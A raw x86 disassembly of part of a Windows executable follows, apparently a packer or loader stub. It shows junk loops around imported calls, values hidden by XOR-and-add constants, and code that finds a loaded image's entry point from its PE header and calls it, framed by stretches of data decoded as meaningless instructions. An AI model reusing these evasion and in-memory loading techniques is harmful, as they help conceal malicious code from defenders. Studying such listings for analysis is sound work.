  40d74f:	xchg   ebx,eax
  40d750:	ficom  WORD PTR [ebp+0x3171388a]
  40d756:	pop    ss
  40d757:	cmp    DWORD PTR ds:0xa4e921b4,edx
  40d75d:	scas   eax,DWORD PTR es:[edi]
  40d75e:	shr    BYTE PTR [edx+ecx*4],0x92
  40d762:	daa    
  40d763:	in     eax,0x47
  40d765:	mov    DWORD PTR [ecx],0xd6628d67
  40d76b:	mov    edx,0x9befad5e
  40d770:	sti    
  40d771:	xor    DWORD PTR [eax-0x5c0b16ce],edx
  40d777:	loop   0x40d7b3
  40d779:	js     0x40d751
  40d77b:	mov    DWORD PTR [ecx],eax
  40d77d:	inc    esp
  40d77e:	jle    0x40d7fc
  40d780:	cmc    
  40d781:	daa    
  40d782:	ret    
  40d783:	jmp    0xb847:0x3958c1d0
  40d78a:	pop    edx
  40d78b:	inc    eax
  40d78c:	jae    0x40d7e4
  40d78e:	mov    dh,dh
  40d790:	xor    al,0x31
  40d792:	daa    
  40d793:	xchg   eax,esp
  40d795:	xchg   edx,eax
  40d796:	mov    al,0xaa
  40d798:	mov    ?,WORD PTR [esi+0x5e]
  40d79b:	mov    edx,esp
  40d79d:	fsub   QWORD PTR [ebx+0x19dc4649]
  40d7a3:	retf   
  40d7a4:	ins    BYTE PTR es:[edi],dx
  40d7a5:	add    BYTE PTR [ebx+0x77],ch
  40d7a8:	pop    ss
  40d7a9:	test   BYTE PTR [ecx+0xf],cl
  40d7ac:	mov    eax,ds:0x5abde3da
  40d7b1:	cs scas al,BYTE PTR es:[edi]
  40d7b3:	push   edx
  40d7b4:	fwait
  40d7b5:	xchg   esp,eax
  40d7b6:	jp     0x40d7a8
  40d7b8:	mov    bh,0x4a
  40d7ba:	enter  0x4bce,0x6c
  40d7be:	das    
  40d7bf:	call   0xf80a7512
  40d7c4:	inc    esi
  40d7c5:	dec    ebp
  40d7c6:	cdq    
  40d7c7:	sbb    eax,0xb7cdf702
  40d7cc:	out    0x12,eax
  40d7ce:	mov    ebp,0x7fc6f100
  40d7d3:	xor    DWORD PTR [ebp-0x55],edi
  40d7d6:	sub    esp,edi
  40d7d8:	jmp    0x1615:0x409cd603
  40d7df:	cmp    al,0x39
  40d7e1:	mov    esp,gs
  40d7e3:	jb     0x40d770
  40d7e5:	pop    esp
  40d7e6:	aam    0x8f
  40d7e8:	dec    ebx
  40d7e9:	out    0x5e,eax
  40d7eb:	jge    0x40d82b
  40d7ed:	data16 aad 0x9a
  40d7f0:	mov    ds:0x72a3f4c7,eax
  40d7f5:	pusha  
  40d7f6:	jmp    0xe7c6:0x7c458e4e
  40d7fd:	mov    dl,0xf
  40d7ff:	sbb    al,0xf3
  40d801:	or     BYTE PTR [ecx+0x2],0x96
  40d805:	scas   eax,DWORD PTR es:[edi]
  40d806:	and    edi,DWORD PTR [ecx]
  40d808:	call   0x35b2a629
  40d80d:	lahf   
  40d80e:	push   ebx
  40d80f:	aas    
  40d810:	mov    eax,ds:0xc7811ce3
  40d815:	stos   BYTE PTR es:[edi],al
  40d816:	ret    0xa5ec
  40d819:	out    dx,eax
  40d81a:	xchg   edi,eax
  40d81b:	cli    
  40d81c:	sub    eax,0x3320753f
  40d821:	shl    DWORD PTR [esi-0x5164a9c5],1
  40d827:	push   edx
  40d828:	ja     0x40d7fe
  40d82a:	jno    0x40d860
  40d82c:	inc    eax
  40d82d:	sub    BYTE PTR [ecx],ah
  40d82f:	jmp    0x2136f266
  40d834:	sbb    ah,BYTE PTR [edi]
  40d836:	xchg   ecx,eax
  40d837:	dec    esi
  40d838:	xchg   edx,eax
  40d839:	jge    0x40d8a4
  40d83b:	outs   dx,BYTE PTR ds:[esi]
  40d83c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d83d:	mov    cl,0x1a
  40d83f:	lock cs hlt 
  40d842:	push   cs
  40d843:	pop    esp
  40d844:	dec    esi
  40d845:	jns    0x40d8a8
  40d847:	imul   edx,edx,0x998bad40
  40d84d:	neg    esp
  40d84f:	stos   BYTE PTR es:[edi],al
  40d850:	xchg   DWORD PTR [ebp-0x75],ebx
  40d853:	hlt    
  40d854:	fadd   st,st(7)
  40d856:	push   cs
  40d857:	jns    0x40d7d9
  40d859:	jnp    0x40d802
  40d85b:	das    
  40d85c:	xor    BYTE PTR [edi-0x25],dl
  40d85f:	sti    
  40d860:	rcl    DWORD PTR [ebp-0x6087293b],0xba
  40d867:	and    DWORD PTR [edi-0x2b8cb61b],esi
  40d86d:	cmp    DWORD PTR [esp+ecx*8],0x7d037e99
  40d874:	lock mov edx,DWORD PTR [ebp-0x20]
  40d878:	mov    ebx,DWORD PTR [ebp-0x8]
  40d87b:	xor    edx,eax
  40d87d:	add    edx,ecx
  40d87f:	imul   edx,ebx
  40d882:	cmp    edx,edi
  40d884:	jbe    0x40a7b9
  40d88a:	pop    ebx
  40d88b:	pop    edi
  40d88c:	leave  
  40d88d:	ret    0x8
  40d890:	push   ebp
  40d891:	mov    ebp,esp
  40d893:	sub    esp,0x70
  40d896:	or     DWORD PTR ds:0x42fce9,0x42e11c
  40d8a0:	push   0x41b2bc
  40d8a5:	sbb    DWORD PTR ds:0x42fd76,0x42fcf1
  40d8af:	call   DWORD PTR ds:0x42e497
  40d8b5:	and    DWORD PTR ds:0x42fcfd,0x42fd82
  40d8bf:	test   ax,ax
  40d8c2:	jne    0x40d8d9
  40d8c8:	xor    eax,eax
  40d8ca:	mov    DWORD PTR ds:0x42e134,0x1bc4
  40d8d4:	jmp    0x40e0cc
  40d8d9:	adc    DWORD PTR ds:0x42e124,0x42fce9
  40d8e3:	push   0x41b2d4
  40d8e8:	call   DWORD PTR ds:0x42e50f
  40d8ee:	sbb    DWORD PTR ds:0x42e6fb,0x42fd72
  40d8f8:	test   ax,ax
  40d8fb:	mov    DWORD PTR ds:0x42fcf5,0x74f8
  40d905:	je     0x40d8c8
  40d90b:	call   DWORD PTR ds:0x42e457
  40d911:	cdq    
  40d912:	mov    DWORD PTR ds:0x42fd05,0x1251
  40d91c:	cmp    eax,0x45767589
  40d921:	jne    0x40d98c
  40d927:	mov    DWORD PTR ds:0x42fd76,0x294f
  40d931:	cmp    edx,0x87676567
  40d937:	jne    0x40d98c
  40d93d:	push   0x0
  40d93f:	push   0x0
  40d941:	adc    DWORD PTR ds:0x42e124,0x42e6f7
  40d94b:	push   0x9879874
  40d950:	push   0x45
  40d952:	push   0x1
  40d954:	push   0x545
  40d959:	push   0x87686787
  40d95e:	xor    DWORD PTR ds:0x42fd6e,0x75b9
  40d968:	push   0x9879877
  40d96d:	or     DWORD PTR ds:0x42fced,0x42e118
  40d977:	call   DWORD PTR ds:0x42e49f
  40d97d:	mov    DWORD PTR ds:0x42e11c,0x1611
  40d987:	jmp    0x40e0cc
  40d98c:	push   0x41b2e0
  40d991:	call   DWORD PTR ds:0x42e38f
  40d997:	test   eax,eax
  40d999:	je     0x40d9cd
  40d99f:	sbb    DWORD PTR ds:0x42fd01,0x42e134
  40d9a9:	push   0x41b314
  40d9ae:	and    DWORD PTR ds:0x42fced,0x2b9d
  40d9b8:	call   DWORD PTR ds:0x42e2fb
  40d9be:	mov    DWORD PTR ds:0x42fd8a,0x47ee
  40d9c8:	jmp    0x40e0cc
  40d9cd:	push   ebx
  40d9ce:	mov    ebx,0xf89c8531
  40d9d3:	add    DWORD PTR ds:0x42e118,ebx
  40d9d9:	mov    DWORD PTR [ebp-0x8],ebx
  40d9dc:	and    DWORD PTR ds:0x42fcf5,0x0
  40d9e6:	mov    ecx,DWORD PTR ds:0x42fcf5
  40d9ec:	inc    ecx
  40d9ed:	mov    DWORD PTR ds:0x42fcf5,ecx
  40d9f3:	cmp    DWORD PTR ds:0x42fcf5,0xf
  40d9fa:	jne    0x40da20
  40da00:	push   0x1990
  40da05:	push   0x7f06
  40da0a:	push   0x857e
  40da0f:	push   DWORD PTR [ebp-0x28]
  40da12:	push   0x42e18d
  40da17:	push   DWORD PTR [ebp-0x10]
  40da1a:	call   DWORD PTR ds:0x42e54f
  40da20:	cmp    DWORD PTR ds:0x42fcf5,0xe
  40da27:	jne    0x40da3a
  40da2d:	mov    ecx,DWORD PTR ds:0x42fcf5
  40da33:	inc    ecx
  40da34:	mov    DWORD PTR ds:0x42fcf5,ecx
  40da3a:	cmp    DWORD PTR ds:0x42fcf5,0x1d
  40da41:	jb     0x40d9e6
  40da47:	add    DWORD PTR ds:0x42e703,0x406c
  40da51:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  40da58:	lea    eax,[ebp-0x18]
  40da5b:	adc    DWORD PTR ds:0x42e6f3,ecx
  40da61:	mov    DWORD PTR [ebp-0x14],eax
  40da64:	adc    DWORD PTR ds:0x42fcd1,0x42e11c
  40da6e:	lea    eax,[ebp-0x1c]
  40da71:	mov    DWORD PTR ds:0x42fd05,0x1a
  40da7b:	cmp    DWORD PTR ds:0x42fd05,0x0
  40da82:	je     0x40dbc3
  40da88:	cmp    DWORD PTR ds:0x42fd05,0x1c
  40da8f:	jne    0x40daa1
  40da95:	push   DWORD PTR [ebp-0x1c]
  40da98:	push   DWORD PTR [ebp-0x14]
  40da9b:	call   DWORD PTR ds:0x42e553
  40daa1:	xor    ecx,ecx
  40daa3:	add    ecx,DWORD PTR ds:0x42fd05
  40daa9:	dec    ecx
  40daaa:	mov    DWORD PTR ds:0x42fd05,ecx
  40dab0:	jmp    0x40da7b
  40dab5:	mov    DWORD PTR ds:0x42e707,0x1d
  40dabf:	cmp    DWORD PTR ds:0x42e707,0x0
  40dac6:	je     0x40dbc3
  40dacc:	cmp    DWORD PTR ds:0x42e707,0xf
  40dad3:	jne    0x40dae4
  40dad9:	push   0x1303
  40dade:	call   DWORD PTR ds:0x42e463
  40dae4:	cmp    DWORD PTR ds:0x42e707,0x10
  40daeb:	jne    0x40dafe
  40daf1:	mov    ecx,DWORD PTR ds:0x42e707
  40daf7:	dec    ecx
  40daf8:	mov    DWORD PTR ds:0x42e707,ecx
  40dafe:	mov    ecx,DWORD PTR ds:0x42e707
  40db04:	dec    ecx
  40db05:	mov    DWORD PTR ds:0x42e707,ecx
  40db0b:	jmp    0x40dabf
  40db10:	mov    DWORD PTR ds:0x42e6ff,0x14
  40db1a:	cmp    DWORD PTR ds:0x42e6ff,0x0
  40db21:	je     0x40dbc3
  40db27:	cmp    DWORD PTR ds:0x42e6ff,0x2
  40db2e:	jne    0x40db41
  40db34:	push   0x1
  40db36:	push   0x279d
  40db3b:	call   DWORD PTR ds:0x42e557
  40db41:	cmp    DWORD PTR ds:0x42e6ff,0x3
  40db48:	jne    0x40db5b
  40db4e:	mov    ecx,DWORD PTR ds:0x42e6ff
  40db54:	dec    ecx
  40db55:	mov    DWORD PTR ds:0x42e6ff,ecx
  40db5b:	mov    ecx,DWORD PTR ds:0x42e6ff
  40db61:	dec    ecx
  40db62:	mov    DWORD PTR ds:0x42e6ff,ecx
  40db68:	jmp    0x40db1a
  40db6d:	mov    DWORD PTR ds:0x42fd76,0x1a
  40db77:	cmp    DWORD PTR ds:0x42fd76,0x0
  40db7e:	je     0x40dbc3
  40db84:	cmp    DWORD PTR ds:0x42fd76,0x6
  40db8b:	jne    0x40db97
  40db91:	call   DWORD PTR ds:0x42e55b
  40db97:	cmp    DWORD PTR ds:0x42fd76,0x7
  40db9e:	jne    0x40dbb1
  40dba4:	mov    ecx,DWORD PTR ds:0x42fd76
  40dbaa:	dec    ecx
  40dbab:	mov    DWORD PTR ds:0x42fd76,ecx
  40dbb1:	mov    ecx,DWORD PTR ds:0x42fd76
  40dbb7:	dec    ecx
  40dbb8:	mov    DWORD PTR ds:0x42fd76,ecx
  40dbbe:	jmp    0x40db77
  40dbc3:	mov    DWORD PTR [ebp-0xc],eax
  40dbc6:	or     ecx,eax
  40dbc8:	mov    eax,ds:0x41b1a8
  40dbcd:	or     DWORD PTR ds:0x42e707,edx
  40dbd3:	mov    eax,DWORD PTR [eax+0x1c8]
  40dbd9:	or     DWORD PTR ds:0x42e713,edx
  40dbdf:	mov    eax,DWORD PTR [eax]
  40dbe1:	mov    ecx,DWORD PTR [ebp-0xc]
  40dbe4:	push   esi
  40dbe5:	mov    esi,0x7510855
  40dbea:	sub    DWORD PTR ds:0x42fd7e,0x662
  40dbf4:	xor    eax,esi
  40dbf6:	push   edi
  40dbf7:	and    DWORD PTR ds:0x42fce5,0x0
  40dc01:	jmp    0x40dc13
  40dc06:	mov    edi,DWORD PTR ds:0x42fce5
  40dc0c:	inc    edi
  40dc0d:	mov    DWORD PTR ds:0x42fce5,edi
  40dc13:	cmp    DWORD PTR ds:0x42fce5,0x1d
  40dc1a:	jae    0x40dc4a
  40dc20:	cmp    DWORD PTR ds:0x42fce5,0x2b
  40dc27:	jne    0x40dc45
  40dc2d:	push   0x3dd1
  40dc32:	push   DWORD PTR [ebp-0x24]
  40dc35:	push   0x2bbe
  40dc3a:	push   0x75d2
  40dc3f:	call   DWORD PTR ds:0x42e467
  40dc45:	jmp    0x40dc06
  40dc4a:	mov    edi,0x32729c
  40dc4f:	add    eax,edi
  40dc51:	mov    DWORD PTR [ecx],eax
  40dc53:	mov    DWORD PTR ds:0x42e128,edx
  40dc59:	mov    eax,ds:0x41b418
  40dc5e:	mov    DWORD PTR ds:0x42fd01,0x477b
  40dc68:	cmp    eax,0x23c13046
  40dc6d:	mov    eax,DWORD PTR [ebp-0x4]
  40dc70:	mov    DWORD PTR ds:0x42fd09,0x45bc
  40dc7a:	je     0x40dd06
  40dc80:	mov    DWORD PTR ds:0x42e6f7,0x1c
  40dc8a:	cmp    DWORD PTR ds:0x42e6f7,0x0
  40dc91:	je     0x40dcd6
  40dc97:	cmp    DWORD PTR ds:0x42e6f7,0xa
  40dc9e:	jne    0x40dcaa
  40dca4:	call   DWORD PTR ds:0x42e46b
  40dcaa:	cmp    DWORD PTR ds:0x42e6f7,0xb
  40dcb1:	jne    0x40dcc4
  40dcb7:	mov    ecx,DWORD PTR ds:0x42e6f7
  40dcbd:	dec    ecx
  40dcbe:	mov    DWORD PTR ds:0x42e6f7,ecx
  40dcc4:	mov    ecx,DWORD PTR ds:0x42e6f7
  40dcca:	dec    ecx
  40dccb:	mov    DWORD PTR ds:0x42e6f7,ecx
  40dcd1:	jmp    0x40dc8a
  40dcd6:	mov    ecx,DWORD PTR [ebp-0x8]
  40dcd9:	sbb    DWORD PTR ds:0x42fd82,0x42e12c
  40dce3:	xor    eax,esi
  40dce5:	and    DWORD PTR ds:0x42fd82,0x42e124
  40dcef:	add    eax,edi
  40dcf1:	imul   eax,ecx
  40dcf4:	mov    DWORD PTR [ebp-0x8],eax
  40dcf7:	mov    DWORD PTR ds:0x42fcd1,0x365a
  40dd01:	jmp    0x40ddd3
  40dd06:	sbb    DWORD PTR ds:0x42e118,edx
  40dd0c:	xor    eax,esi
  40dd0e:	add    eax,edi
  40dd10:	and    DWORD PTR ds:0x42fd72,0x0
  40dd1a:	jmp    0x40dd2c
  40dd1f:	mov    ecx,DWORD PTR ds:0x42fd72
  40dd25:	inc    ecx
  40dd26:	mov    DWORD PTR ds:0x42fd72,ecx
  40dd2c:	cmp    DWORD PTR ds:0x42fd72,0x12
  40dd33:	jae    0x40dd6e
  40dd39:	cmp    DWORD PTR ds:0x42fd72,0x6
  40dd40:	jne    0x40dd4f
  40dd46:	push   DWORD PTR [ebp-0x24]
  40dd49:	call   DWORD PTR ds:0x42e46f
  40dd4f:	cmp    DWORD PTR ds:0x42fd72,0x5
  40dd56:	jne    0x40dd69
  40dd5c:	mov    ecx,DWORD PTR ds:0x42fd72
  40dd62:	inc    ecx
  40dd63:	mov    DWORD PTR ds:0x42fd72,ecx
  40dd69:	jmp    0x40dd1f
  40dd6e:	mov    ds:0x41b2b8,eax
  40dd73:	mov    eax,DWORD PTR [ebp-0x8]
  40dd76:	or     DWORD PTR ds:0x42fd0d,edx
  40dd7c:	xor    eax,esi
  40dd7e:	sub    DWORD PTR ds:0x42e130,edx
  40dd84:	add    eax,edi
  40dd86:	mov    ds:0x41b418,eax
  40dd8b:	mov    eax,DWORD PTR [ebp-0x4]
  40dd8e:	mov    ecx,DWORD PTR ds:0x41b2b8
  40dd94:	xor    eax,esi
  40dd96:	add    eax,edi
  40dd98:	mov    DWORD PTR ds:0x42fd09,0x3e5c
  40dda2:	cmp    ecx,eax
  40dda4:	jne    0x40ddd3
  40ddaa:	sub    DWORD PTR ds:0x42fd86,0x42fcfd
  40ddb4:	push   DWORD PTR [ebp-0x4]
  40ddb7:	and    DWORD PTR ds:0x42e6f3,0x4c1c
  40ddc1:	push   DWORD PTR [ebp-0x8]
  40ddc4:	adc    DWORD PTR ds:0x42e6ff,0x42fd8a
  40ddce:	call   0x40e0d0
  40ddd3:	mov    eax,ds:0x41b1a8
  40ddd8:	sbb    edx,DWORD PTR ds:0x42e6eb
  40ddde:	mov    eax,DWORD PTR [eax+0x18c]
  40dde4:	and    DWORD PTR ds:0x42fce5,0x0
  40ddee:	mov    edx,DWORD PTR ds:0x42fce5
  40ddf4:	inc    edx
  40ddf5:	mov    DWORD PTR ds:0x42fce5,edx
  40ddfb:	cmp    DWORD PTR ds:0x42fce5,0x18
  40de02:	jne    0x40de18
  40de08:	push   0x42fd09
  40de0d:	push   0x42e26d
  40de12:	call   DWORD PTR ds:0x42e473
  40de18:	cmp    DWORD PTR ds:0x42fce5,0x13
  40de1f:	jb     0x40ddee
  40de25:	mov    ecx,DWORD PTR ds:0x42fd21
  40de2b:	mov    ecx,DWORD PTR [ecx]
  40de2d:	or     DWORD PTR ds:0x42fcfd,ecx
  40de33:	mov    eax,DWORD PTR [eax]
  40de35:	mov    DWORD PTR ds:0x42fcf5,0x11
  40de3f:	cmp    DWORD PTR ds:0x42fcf5,0x0
  40de46:	je     0x40de77
  40de4c:	cmp    DWORD PTR ds:0x42fcf5,0x19
  40de53:	jne    0x40de65
  40de59:	push   DWORD PTR [ebp-0xc]
  40de5c:	push   DWORD PTR [ebp-0x10]
  40de5f:	call   DWORD PTR ds:0x42e55f
  40de65:	mov    edx,DWORD PTR ds:0x42fcf5
  40de6b:	dec    edx
  40de6c:	mov    DWORD PTR ds:0x42fcf5,edx
  40de72:	jmp    0x40de3f
  40de77:	mov    DWORD PTR [ebp-0x20],eax
  40de7a:	mov    eax,0xf89c853d
  40de7f:	mov    DWORD PTR [ebp-0x24],eax
  40de82:	mov    DWORD PTR [ebp-0x24],eax
  40de85:	mov    DWORD PTR [ebp-0x24],eax
  40de88:	mov    DWORD PTR [ebp-0xc],ebx
  40de8b:	mov    DWORD PTR [ebp-0x24],eax
  40de8e:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  40de95:	mov    ebx,DWORD PTR [ebp-0x8]
  40de98:	mov    ecx,DWORD PTR [ebp-0x4]
  40de9b:	mov    edx,DWORD PTR [ebp-0x4]
  40de9e:	xor    edx,esi
  40dea0:	xor    ecx,esi
  40dea2:	add    ecx,edx
  40dea4:	mov    edx,DWORD PTR [ebp-0x4]
  40dea7:	xor    ebx,esi
  40dea9:	xor    edx,esi
  40deab:	add    ebx,edi
  40dead:	lea    ecx,[ecx+edx*1+0x9757d4]
  40deb4:	cmp    ebx,ecx
  40deb6:	ja     0x40df17
  40debc:	mov    eax,DWORD PTR [ebp-0x4]
  40debf:	xor    eax,esi
  40dec1:	lea    eax,[eax+ebx*1+0x32729c]
  40dec8:	push   eax
  40dec9:	mov    eax,DWORD PTR [ebp-0xc]
  40decc:	xor    eax,esi
  40dece:	lea    eax,[ebp+eax*1+0x3272a4]
  40ded5:	push   eax
  40ded6:	mov    eax,ds:0x41b1a8
  40dedb:	push   DWORD PTR [eax+0x1bc]
  40dee1:	call   0x402976
  40dee6:	mov    eax,DWORD PTR [ebp-0x4]
  40dee9:	xor    eax,esi
  40deeb:	lea    ebx,[ebx+eax*1+0x32729c]
  40def2:	mov    eax,DWORD PTR [ebp-0x4]
  40def5:	mov    ecx,DWORD PTR [ebp-0x4]
  40def8:	xor    ecx,esi
  40defa:	xor    eax,esi
  40defc:	add    eax,ecx
  40defe:	mov    ecx,DWORD PTR [ebp-0x4]
  40df01:	xor    ecx,esi
  40df03:	lea    eax,[eax+ecx*1+0x9757d4]
  40df0a:	cmp    ebx,eax
  40df0c:	jbe    0x40debc
  40df12:	mov    eax,0xf89c853d
  40df17:	mov    ecx,DWORD PTR [ebp+0xc]
  40df1a:	mov    DWORD PTR ds:0x41b02c,ecx
  40df20:	mov    ecx,DWORD PTR [ebp+0x10]
  40df23:	mov    DWORD PTR ds:0x41b280,ecx
  40df29:	mov    ecx,DWORD PTR ds:0x41b02c
  40df2f:	mov    edx,DWORD PTR [ebp-0x14]
  40df32:	sub    ecx,edi
  40df34:	xor    ecx,esi
  40df36:	mov    DWORD PTR [edx],ecx
  40df38:	mov    ecx,DWORD PTR [ebp-0x18]
  40df3b:	cmp    ecx,0xf89c8530
  40df41:	je     0x40df9e
  40df47:	mov    ecx,DWORD PTR [ebp-0x8]
  40df4a:	mov    edx,DWORD PTR [ebp-0x1c]
  40df4d:	xor    ecx,esi
  40df4f:	add    ecx,edi
  40df51:	cmp    ecx,edx
  40df53:	je     0x40df9e
  40df59:	mov    eax,ds:0x41b1a8
  40df5e:	mov    eax,DWORD PTR [eax+0x194]
  40df64:	mov    ecx,DWORD PTR [eax]
  40df66:	mov    eax,DWORD PTR [ecx+0x3c]
  40df69:	push   DWORD PTR ds:0x41b280
  40df6f:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40df73:	push   DWORD PTR ds:0x41b02c
  40df79:	add    eax,ecx
  40df7b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df81:	mov    ecx,DWORD PTR [ecx+0x194]
  40df87:	push   DWORD PTR [ecx]
  40df89:	call   eax
  40df8b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df91:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40df97:	mov    DWORD PTR [ecx],eax
  40df99:	jmp    0x40e0ae
  40df9e:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfa1:	mov    edx,DWORD PTR [ebp-0x20]
  40dfa4:	xor    ecx,esi
  40dfa6:	add    ecx,edi
  40dfa8:	cmp    ecx,edx
  40dfaa:	jne    0x40e091
  40dfb0:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfb3:	xor    ecx,esi
  40dfb5:	add    ecx,edi
  40dfb7:	mov    DWORD PTR ds:0x41b22c,ecx
  40dfbd:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfc0:	xor    ecx,esi
  40dfc2:	add    ecx,edi
  40dfc4:	mov    DWORD PTR ds:0x41b224,ecx
  40dfca:	mov    ecx,DWORD PTR [ebp-0x4]
  40dfcd:	mov    DWORD PTR [ebp-0xc],ecx
  40dfd0:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfd3:	mov    DWORD PTR [ebp+0xc],ecx
  40dfd6:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfd9:	xor    ecx,esi
  40dfdb:	add    ecx,edi
  40dfdd:	mov    DWORD PTR [ebp+0xc],ecx
  40dfe0:	mov    ecx,DWORD PTR ds:0x41b028
  40dfe6:	mov    ecx,DWORD PTR [ecx]
  40dfe8:	mov    DWORD PTR [ebp+0xc],ecx
  40dfeb:	mov    ecx,DWORD PTR ds:0x41b230
  40dff1:	mov    ecx,DWORD PTR [ecx]
  40dff3:	mov    DWORD PTR [ebp-0x14],ecx
  40dff6:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  40dffd:	mov    ecx,DWORD PTR [ebp+0x10]
  40e000:	xor    ecx,esi
  40e002:	add    ecx,edi
  40e004:	mov    DWORD PTR [ebp+0x10],ecx
  40e007:	mov    ecx,DWORD PTR ds:0x41b1a8
  40e00d:	mov    DWORD PTR [ebp+0x10],ecx
  40e010:	mov    ecx,DWORD PTR [ebp+0xc]
  40e013:	mov    DWORD PTR [ebp+0xc],ecx
  40e016:	mov    ecx,DWORD PTR [ebp+0xc]
  40e019:	push   0x4
  40e01b:	pop    edx
  40e01c:	sub    edx,ecx
  40e01e:	add    edx,DWORD PTR [ebp-0x14]
  40e021:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40e028:	mov    DWORD PTR [ebp+0x10],edx
  40e02b:	mov    DWORD PTR [ebp-0x70],eax
  40e02e:	mov    eax,DWORD PTR [ebp+0xc]
  40e031:	mov    DWORD PTR [ebp-0x6c],eax
  40e034:	mov    eax,DWORD PTR [ebp+0x10]
  40e037:	mov    DWORD PTR [ebp-0x68],eax
  40e03a:	mov    eax,DWORD PTR [ebp-0x24]
  40e03d:	xor    eax,esi
  40e03f:	add    eax,edi
  40e041:	mov    DWORD PTR [ebp-0x64],eax
  40e044:	lea    eax,[ebp-0x2c]
  40e047:	mov    DWORD PTR [ebp-0x60],eax
  40e04a:	mov    eax,DWORD PTR [ebp-0x70]
  40e04d:	xor    eax,esi
  40e04f:	add    eax,edi
  40e051:	mov    DWORD PTR [ebp-0x70],eax
  40e054:	lea    eax,[ebp-0x70]
  40e057:	push   eax
  40e058:	mov    eax,DWORD PTR [ebp-0xc]
  40e05b:	xor    eax,esi
  40e05d:	add    eax,edi
  40e05f:	push   eax
  40e060:	mov    eax,ds:0x41b1c8
  40e065:	push   0x41b11e
  40e06a:	push   DWORD PTR [eax]
  40e06c:	call   0x4120bb
  40e071:	xor    esi,esi
  40e073:	mov    eax,DWORD PTR [ebp+0x10]
  40e076:	sub    eax,esi
  40e078:	push   eax
  40e079:	mov    eax,DWORD PTR [ebp+0xc]
  40e07c:	add    eax,esi
  40e07e:	push   eax
  40e07f:	call   0x4099c9
  40e084:	inc    esi
  40e085:	cmp    esi,0x52
  40e088:	jb     0x40e073
  40e08e:	mov    eax,DWORD PTR [ebp-0xc]
  40e091:	call   0x406acb
  40e096:	lea    eax,[ebp+0x4]
  40e099:	mov    DWORD PTR [ebp-0x28],eax
  40e09c:	mov    eax,DWORD PTR [ebp-0x10]
  40e09f:	mov    eax,DWORD PTR [ebp-0x4]
  40e0a2:	push   DWORD PTR [ebp-0x8]
  40e0a5:	lea    eax,[ebp-0x28]
  40e0a8:	push   eax
  40e0a9:	call   0x410b90
  40e0ae:	mov    eax,ds:0x41b1a8
  40e0b3:	push   0x4
  40e0b5:	add    eax,0x1cc
  40e0ba:	push   eax
  40e0bb:	lea    eax,[ebp-0x10]
  40e0be:	push   eax
  40e0bf:	call   0x402976
  40e0c4:	mov    eax,DWORD PTR [ebp-0x10]
  40e0c7:	mov    eax,DWORD PTR [eax]
  40e0c9:	pop    edi
  40e0ca:	pop    esi
  40e0cb:	pop    ebx
  40e0cc:	leave  
  40e0cd:	ret    0xc
  40e0d0:	push   ebp
  40e0d1:	mov    ebp,esp
  40e0d3:	sub    esp,0x24
  40e0d6:	mov    eax,ds:0x41b1a8
  40e0db:	mov    eax,DWORD PTR [eax+0x198]
  40e0e1:	mov    DWORD PTR [ebp-0x8],eax
  40e0e4:	adc    ecx,eax
  40e0e6:	mov    eax,DWORD PTR [ebp+0x8]
  40e0e9:	mov    ecx,DWORD PTR [ebp-0x8]
  40e0ec:	xor    DWORD PTR ds:0x42fce9,0x42fcd5
  40e0f6:	push   ebx
  40e0f7:	push   esi
  40e0f8:	mov    esi,0x7510855
  40e0fd:	xor    eax,esi
  40e0ff:	not    ebx
  40e101:	push   edi
  40e102:	mov    edi,0x32729c
  40e107:	add    eax,edi
  40e109:	sbb    ebx,DWORD PTR ds:0x42fce9
  40e10f:	jmp    0x40e279
  40e114:	sub    dl,0xce
  40e117:	gs push 0x61
  40e11a:	mov    bh,0xf1
  40e11c:	fstp   DWORD PTR [ecx+0x3af8d044]
  40e122:	int3   
  40e123:	punpckhbw mm4,QWORD PTR [esi+0x7fc37070]
  40e12a:	jo     0x40e19c
  40e12c:	gs (bad) 
  40e12e:	test   BYTE PTR [ecx-0x73f2ae1],0x3
  40e135:	push   es
  40e136:	pusha  
  40e137:	imul   esi,DWORD PTR [edi+0x7f],0x3d052d2c
  40e13e:	dec    edx
  40e13f:	inc    ebx
  40e140:	xchg   edi,eax
  40e141:	mov    ebp,0x7a6a21c2
  40e146:	ins    DWORD PTR es:[edi],dx
  40e147:	xchg   esp,edx
  40e149:	or     BYTE PTR [edx],0x39
  40e14c:	daa    
  40e14d:	mov    ds:0x4651f699,eax
  40e152:	adc    ah,BYTE PTR [ebx]
  40e154:	addr16 aad 0x35
  40e157:	int3   
  40e158:	xchg   esp,eax
  40e159:	adc    ch,ah
  40e15b:	stc    
  40e15c:	ins    BYTE PTR es:[edi],dx
  40e15d:	or     eax,0x6444d21e
  40e162:	mov    DWORD PTR [ecx],esp
  40e164:	and    BYTE PTR [edi+ebx*2-0x43fe16a2],cl
  40e16b:	mov    edx,0xe57d2587
  40e170:	mov    ah,0x5c
  40e172:	inc    BYTE PTR [esi+0x3e]
  40e175:	mov    ebp,0x466ed5e9
  40e17b:	adc    dl,dl
  40e17d:	pop    edi
  40e17e:	and    DWORD PTR [edx+0x1b],edx
  40e181:	add    eax,0x8aa8132
  40e186:	mov    esp,edx
  40e188:	imul   esp,ebx,0x2c966291
  40e18e:	jae    0x40e1d1
  40e190:	adc    bh,BYTE PTR [esi]
  40e192:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e193:	pop    eax
  40e194:	dec    edx
  40e195:	push   es
  40e196:	out    0x5b,eax
  40e198:	retf   0x9d20
  40e19b:	add    edx,edi
  40e19d:	arpl   ax,si
  40e19f:	neg    BYTE PTR [ebp+edi*8+0x4a7fe37]
  40e1a6:	cmc    
  40e1a7:	xchg   edi,eax
  40e1a8:	mov    eax,0xcc7279c7
  40e1ad:	ss xchg esp,eax
  40e1af:	loop   0x40e1b6
  40e1b1:	pop    edi
  40e1b2:	mov    bl,0x92
